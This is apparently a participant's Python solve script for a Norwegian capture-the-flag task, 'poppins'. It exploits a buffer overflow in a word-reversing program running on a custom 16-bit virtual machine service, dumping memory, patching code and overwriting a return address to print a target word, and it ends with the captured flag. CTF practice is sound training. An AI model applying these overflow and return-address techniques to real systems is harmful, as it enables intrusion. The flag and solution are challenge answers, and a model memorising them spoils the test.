import requests
import json
from base64 import b64encode, b64decode
from pprint import pprint

URL = "https://mov16.cloud"

my_cookie = {
    "name":'access_token',
    "value":'...',
}

s = requests.session()
s.cookies.set(**my_cookie)

def build(contents):
    data = json.dumps({"source": contents})
    r = s.post(URL + "/build", data=data)
    r = json.loads(r.content)

    if 'error' in r:
        raise Exception(f"Build failed: {r['error']}")
    return b64decode(r['binary'])

def run(binary, input=b""):
    data = json.dumps({"binary": binary, "input": {'13': b64encode(input).decode()}})
    res = s.post(URL + "/run", data=data)
    res = json.loads(res.content)

    return res

def poppins(input: bytes):
    data = json.dumps({"input": b64encode(input).decode()})
    res = s.post(URL + "/challenge/poppins", data=data)
    res = json.loads(res.content)

    res = res["tests"]
    assert len(res) == 1
    res = res[0]

    return res


def show(data, metrics=False, debug=True):
    if metrics:
        print("== METRICS ==")
        for name, val in data["metrics"].items():
            print(f"{name}: {val}")

    print("== STATE ==")
    for name, val in data["state"].items():
        print(f"{name}: {val:8} {val:8x}")

    print("== OUTPUT ==")
    output = data["output"]
    for id, content in output.items():
        if len(output) > 1:
            print(f"== OUTPUT MODULE {id} ==")

        decoded = b64decode(content)
        if b"PNG" in decoded:
            print(f"<Saved to {id}.png>")
            with open(f"{id}.png", "wb") as f:
                f.write(decoded)
        else:
            decoded = decoded.decode("utf-16be")
            print(decoded)

    if debug:
        debug_d = data['debug_output']
        if len(debug_d) > 0:
            print("== DEBUG ==")
            print(debug_d)

def make_patchset(want, have):
    want = [want[i:i+2] for i in range(0, len(want), 2)]
    have = [have[i:i+2] for i in range(0, len(have), 2)]

    output = []
    for i, (w, h) in enumerate(zip(want, have)):
        if w == h:
            continue
        output.append((i, w, h))
    
    return output

code = """% STD
;;; This program reads words from the input and writes each word
;;; reversed. Words are separated by space, tab and newline

; DBG <- 51 ; +0: 3FF1
; DBG <- 52 ; +1: 3FF3

loop:
	;; Stop if there is no more input
	!ICO ? NIP <- #HLT

	;; Call read_and_reverse with word_buffer as destination
	;; pointer. The function returns the length of the word
	;; in RES.
	STT <- #word_buffer
	NIP <- #read_and_reverse

	;; Print the reversed word

	;; Temporary variable with a pointer to the word
	STT <- #word_buffer

print_loop:
	;; Stop when all characters are printed
	!RES ? NIP <- #print_done

	;; Print character
	PRN <- *ST0

	;; Increment pointer
	ST0 <- INC <- ST0

	;; Decrement counter
	RES <- DEC <- RES

	;; Loop
	NIP <- #print_loop
print_done:
	;; Clean up the stack and continue reading
	RES <- STT

	NIP <- #loop

	;; word buffer + separator
word_buffer:
	0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
	0

;;;
;;; Read one word from the input and reverses it.
;;;
;;; The function takes one argument, the destination buffer for the
;;; reversed string.
;;;
;;; The reversed string includes the separator character at the end.
;;;
read_and_reverse:
	;; Get destination pointer from stack
	RES <- STT

	;; Save return address on the stack
	STT <- PIP

	;; Allocate space for 3 variables and a temp buffer
	ALX <- STP
	ALY <- #19
	STP <- DIF

	;; Use ST0 as a pointer to the buffer
	ST0 <- INC <- INC <- INC <- STP

	;; Use ST1 as counter, starting at 0
	ST1 <- #0

	;; Use ST2 as the destination pointer
	ST2 <- RES

read_loop:
    ;DBG <- #0
    ;DBG <- read_and_reverse
	;; Set RES to newline in case there is no more input
	RES <- #10

    ;DBG <- #$111

	;; Stop if there is no more input
	!ICO ? NIP <- #read_done

    ;DBG <- #$222

	;; Read the next character
	RES <- IDA

	;; Stop if it was a space, tab or newline
	ALX <- RES
	ALY <- #' '
	EQU ? NIP <- #read_done
	ALY <- #9
	EQU ? NIP <- #read_done
	ALY <- #10
	EQU ? NIP <- #read_done

	;; If the 16 character limit has been exceeded, print an error
	;; message and stop
	ALX <- ST1
	ALY <- #16
	UGT ? NIP <- #read_error

	;; Write character to buffer
	*ST0 <- RES

	;; Increment pointer and counter
	ST0 <- INC <- ST0
	ST1 <- INC <- ST1

	;; Continue reading
	NIP <- #read_loop

read_done:
    ;DBG <- #$444
	;; Store the length in ALX
	ALX <- ST1

	;; Copy the word to the destination, reading backwards from
	;; the temp buffer
	ST0 <- DEC <- ST0
read_reverse_loop:
    ;DBG <- #$555

	;; Stop if the counter reaches 0
	!ALX ? NIP <- #read_reverse_done

	;; Copy character
	*ST2 <- *ST0

	;; Decrement source pointer
	ST0 <- DEC <- ST0

	;; Decrement counter
	ALX <- DEC <- ALX

	;; Increment dest pointer
	ST2 <- INC <- ST2

	;; Continue copying
	NIP <- #read_reverse_loop

read_reverse_done:
	;; Write the separator character at the end
	*ST2 <- RES

	;; Set the return value to the length of the word plus the
	;; space or newline
	RES <- INC <- ST1
    ; 18! thats more than our buffer :)
    ;DBG <- #$666
    ;DBG <- ST2
    ;DBG <- #read_and_reverse
    ;DBG <- RES

read_return:
	;; Clean up the stack
	ALX <- STP
	ALY <- #19
	STP <- SUM

	;; Return
    ;; This jumps to #read_and_reverse
	NIP <- STT
    ;DBG <- #read_and_reverse
    ;RES <- STT
    ;DBG <- RES

read_error:
	;; Print error message and stop
	RES <- #read_error_string
read_error_loop:
	!*RES ? NIP <- #HLT
	PRN <- *RES
	RES <- INC <- RES
	NIP <- #read_error_loop

read_error_string:
	"ERROR: Maximum word length is 16 characters",10,0
"""

code_bin = build(code)[0x20:]

prn_a    = build("% STD\nDBG <- #'A'")[0x20:]
prn_b    = build("% STD\nDBG <- #'B'")[0x20:]
prn_char = build("% STD\nDBG <- IDA")[0x20:]
hlt      = build("% STD\nNIP <- #HLT")[0x20:]

# original
#
# !ICO ? NIP <- #HLT
# STT <- #word_buffer
# NIP <- #read_and_reverse
#
# !ICO ? NIP <- #1000    ; 1 diff
# STT <- IDA             ; 1 diff
# NIP <- #0              ; 1 diff
jump_after_patched = 0xa2

patched = build(f"""% STD
loop:
    ;!ICO ? NIP <- #HLT
    STT <- IDA
    PRN <- ST0
    NIP <- #0
;    NIP <- #HLT
;    !ICO ? NIP <- #{jump_after_patched}
;    STT <- IDA
;    NIP <- #loop
;after:
;    DBG <- #$1234
;    NIP <- #HLT
""")[0x20:]

print(patched.hex(" ", 2))
print(code_bin[:20].hex(" ", 2))

def memdump():
    m = {}
    for i in range(256):
        dump = build(f"""% STD
            DBG <- {i}
            NIP <- #HLT
            NIP <- #HLT
            NIP <- #HLT
            NIP <- #HLT
            NIP <- #HLT
            NIP <- #HLT
            NIP <- #HLT
        """)[0x20:]
        assert len(dump) == 32, f"is {len(dump)}"
        
        r = poppins(dump + bytes.fromhex("01bb"))
        try:
            out = b64decode(r['actual_output']['15'])
            value = out.split(b" ")[0][1:].decode()
            byts = bytes.fromhex(value)
            m[i] = byts
            print(i, value)
        except:
            print(i, "?")
    return m
        

# mem = memdump()
if True:
    mem = {0: b'\x00-', 1: b'\xbf\xff', 2: b'\xff\xff', 3: b'?\xf3', 4: b'\x80\x1c', 5: b'?\xff', 6: b'\x80-', 7: b'?\xf3', 8: b'\x80\x1c', 11: b'\x80\x18', 12: b'?\xe0', 13: b'\x7f\xf6', 14: b'?\xfd', 15: b'?\xf6', 16: b'?\xf6', 17: b'\x00\n', 18: b'?\xfe', 19: b'?\xf1', 20: b'?\xf1', 21: b'?\xfe', 22: b'?\xff', 23: b'\x80\t', 24: b'?\xf1', 25: b'?\xf3', 26: b'?\xff', 27: b'\x80\x00', 28: b'\x01\xbb', 29: b'\xff\xff', 30: b'?\xff', 31: b'\xff\xff', 33: b'\xff\xff', 34: b'?\xff', 35: b'\xff\xff', 36: b'?\xff', 37: b'\xff\xff', 38: b'?\xff', 39: b'\xff\xff', 40: b'?\xff', 41: b'\xff\xff', 42: b'?\xff', 43: b'\x00+', 44: b'?\xf0', 45: b'\x00\n', 46: b'?\xf3', 47: b'?\xf3', 48: b'?\xff', 49: b'?\xc0', 50: b'?\xf2', 51: b'?\xc1', 52: b'\x80\x13', 53: b'?\xf2', 54: b'?\xc4', 55: b'?\xfd', 56: b'?\xf2', 57: b'?\xfd', 58: b'?\xfd', 59: b'?\xfd', 60: b'?\xfd', 61: b'?\xf6', 62: b'?\xfd', 63: b'?\xf7', 64: b'\x80\x00', 65: b'?\xf8', 66: b'?\xf1', 67: b'?\xf1', 68: b'\x80\n', 69: b'\xbf\xd0', 70: b'\xbf\xff', 71: b'\x80n', 72: b'?\xf1', 73: b'?\xd1', 74: b'?\xc0', 75: b'?\xf1', 76: b'?\xc1', 77: b'\x80 ', 78: b'\xbf\xc4', 79: b'\xbf\xff', 80: b'\x80n', 81: b'?\xc1', 82: b'\x80\t', 83: b'\xbf\xc4', 84: b'\xbf\xff', 85: b'\x80n', 86: b'?\xc1', 87: b'\x80\n', 88: b'\xbf\xc4', 89: b'\xbf\xff', 90: b'\x80n', 91: b'?\xc0', 92: b'?\xf7', 93: b'?\xc1', 94: b'\x80\x10', 95: b'\xbf\xcc', 96: b'?\xff', 97: b'\x80\x95', 98: b'\x7f\xf6', 99: b'?\xf1', 100: b'?\xfd', 101: b'?\xf6', 102: b'?\xf6', 103: b'?\xfd', 104: b'?\xfd', 105: b'?\xf7', 106: b'?\xf7', 107: b'?\xfd', 108: b'?\xff', 109: b'\x80C', 110: b'?\xc0', 111: b'?\xf7', 112: b'?\xfe', 113: b'?\xf6', 114: b'?\xf6', 115: b'?\xfe', 116: b'\xbf\xc0', 117: b'\xbf\xff', 118: b'\x80\x87', 119: b'\x7f\xf8', 120: b'\x7f\xf6', 121: b'?\xfe', 122: b'?\xf6', 123: b'?\xf6', 124: b'?\xfe', 125: b'?\xfe', 126: b'?\xc0', 127: b'?\xc0', 128: b'?\xfe', 129: b'?\xfd', 130: b'?\xf8', 131: b'?\xf8', 132: b'?\xfd', 133: b'?\xff', 134: b'\x80t', 135: b'\x7f\xf8', 136: b'?\xf1', 137: b'?\xfd', 138: b'?\xf7', 139: b'?\xf1', 140: b'?\xfd', 141: b'?\xc0', 142: b'?\xf2', 143: b'?\xc1', 144: b'\x80\x13', 145: b'?\xf2', 146: b'?\xc2', 147: b'?\xff', 148: b'?\xf3', 149: b'?\xf1', 150: b'\x80\xa2', 151: b'\xff\xf1', 152: b'\xbf\xff', 153: b'\xff\xff', 154: b'?\xe0', 155: b'\x7f\xf1', 156: b'?\xfd', 157: b'?\xf1', 158: b'?\xf1', 159: b'?\xfd', 160: b'?\xff', 161: b'\x80\x97', 162: b'\x00E', 163: b'\x00R', 164: b'\x00R', 165: b'\x00O', 166: b'\x00R', 167: b'\x00:', 168: b'\x00 ', 169: b'\x00M', 170: b'\x00a', 171: b'\x00x', 172: b'\x00i', 173: b'\x00m', 174: b'\x00u', 175: b'\x00m', 176: b'\x00 ', 177: b'\x00w', 178: b'\x00o', 179: b'\x00r', 180: b'\x00d', 181: b'\x00 ', 182: b'\x00l', 183: b'\x00e', 184: b'\x00n', 185: b'\x00g', 186: b'\x00t', 187: b'\x00h', 188: b'\x00 ', 189: b'\x00i', 190: b'\x00s', 191: b'\x00 ', 192: b'\x001', 193: b'\x006', 194: b'\x00 ', 195: b'\x00c', 196: b'\x00h', 197: b'\x00a', 198: b'\x00r', 199: b'\x00a', 200: b'\x00c', 201: b'\x00t', 202: b'\x00e', 203: b'\x00r', 204: b'\x00s', 205: b'\x00\n', 206: b'\x00\x00', 207: b'\x00\x00', 208: b'\x00\x00', 209: b'\x00\x00', 210: b'\x00\x00', 211: b'\x00\x00', 212: b'\x00\x00', 213: b'\x00\x00', 214: b'\x00\x00', 215: b'\x00\x00', 216: b'\x00\x00', 217: b'\x00\x00', 218: b'\x00\x00', 219: b'\x00\x00', 220: b'\x00\x00', 221: b'\x00\x00', 222: b'\x00\x00', 223: b'\x00\x00', 224: b'\x00\x00', 225: b'\x00\x00', 226: b'\x00\x00', 227: b'\x00\x00', 228: b'\x00\x00', 229: b'\x00\x00', 230: b'\x00\x00', 231: b'\x00\x00', 232: b'\x00\x00', 233: b'\x00\x00', 234: b'\x00\x00', 235: b'\x00\x00', 236: b'\x00\x00', 237: b'\x00\x00', 238: b'\x00\x00', 239: b'\x00\x00', 240: b'\x00\x00', 241: b'\x00\x00', 242: b'\x00\x00', 243: b'\x00\x00', 244: b'\x00\x00', 245: b'\x00\x00', 246: b'\x00\x00', 247: b'\x00\x00', 248: b'\x00\x00', 249: b'\x00\x00', 250: b'\x00\x00', 251: b'\x00\x00', 252: b'\x00\x00', 253: b'\x00\x00', 254: b'\x00\x00', 255: b'\x00\x00'}

mem_rev = {value:key for key, value in mem.items()}

patch = make_patchset(patched, code_bin)
for i, w, h in patch:
    print(i, w.hex(), h.hex())

    if w in mem_rev:
        print(f"{mem_rev[w]=}")

patch_src = """% STD"""
#patch_src += "\nDBG <- 73"
#patch_src += "\nDBG <- 4"
for i, w, h in patch:
    if w in mem_rev:
        patch_src += f"\n{i} <- {mem_rev[w]} ; {w.hex()}"
    else:
        patch_src += f"\n{i} <- #${w.hex()}"
# patch_src += "\nDBG <- 2"
# patch_src += "\nDBG <- #$321"
# patch_src += f"\nSTP <- #{jump_after_patched + 10}"
# patch_src += "\nDBG <- 0"
#patch_src += "\nDBG <- 1"
# patch_src += "\nDBG <- #$123"
#patch_src += "\nDBG <- 73"
#patch_src += "\nDBG <- 3"
#patch_src += "\nNIP <- #HLT"
patch_src += "\nSTP <- #200"
patch_src += "\nNIP <- #0" * (8 - patch_src.count("\n"))

print("\n==\n" + patch_src + "\n")

patch = build(patch_src)[0x20:]
assert len(patch) == 32

# -5 ...

final_code = build(f"""% STD
PRN <- #'S'
PRN <- #'u'
PRN <- #'p'
PRN <- #'e'
PRN <- #'r'
PRN <- #'c'
PRN <- #'a'
PRN <- #'l'
PRN <- #'i'
PRN <- #'f'
PRN <- #'r'
PRN <- #'a'
PRN <- #'g'
PRN <- #'i'
PRN <- #'l'
PRN <- #'i'
PRN <- #'s'
PRN <- #'t'
PRN <- #'i'
PRN <- #'c'
PRN <- #'e'
PRN <- #'x'
PRN <- #'p'
PRN <- #'i'
PRN <- #'a'
PRN <- #'l'
PRN <- #'i'
PRN <- #'d'
PRN <- #'o'
PRN <- #'c'
PRN <- #'i'
PRN <- #'o'
PRN <- #'u'
PRN <- #'s'

;PRN <- #'A'
;PRN <- #'B'
;PRN <- #'C'
;PRN <- #'D'
NIP <- #HLT
""")[0x20:]

final_words = [final_code[i:i+2] for i in range(0, len(final_code), 2)]
final_filled = b"hi" * (194 - len(final_words)) + b"".join(final_words[::-1])

#jump_dest = b"\xff\xff"
jump_dest = b"\x80\x06"

payload = patch + bytes.fromhex("01bb") + " ".encode("utf-16be")# + b"hi" * 194 + b"\xff\xff"
payload = patch + bytes.fromhex("01bb") + " ".encode("utf-16be") + final_filled + jump_dest

r = poppins(payload)
print(r)
output = r['actual_output']
if output:
    for k, v in output.items():
        byts = b64decode(v)
        print(f"== OUT {k} ({len(byts)}b, {len(byts)//2} words) ==")
        try:
            print(byts.decode())
        except:
            print(byts)


"""
$ scoreboard FLAG{5bfc9ee5f1b7ffa76ed244aeb17b424a}
Kategori: 2.1. Department of Development and Test
Oppgave:  2.1.6_poppins
Svar:     5bfc9ee5f1b7ffa76ed244aeb17b424a
Poeng:    10

Bra jobba, du fikk skrevet ut hele ordet!
"""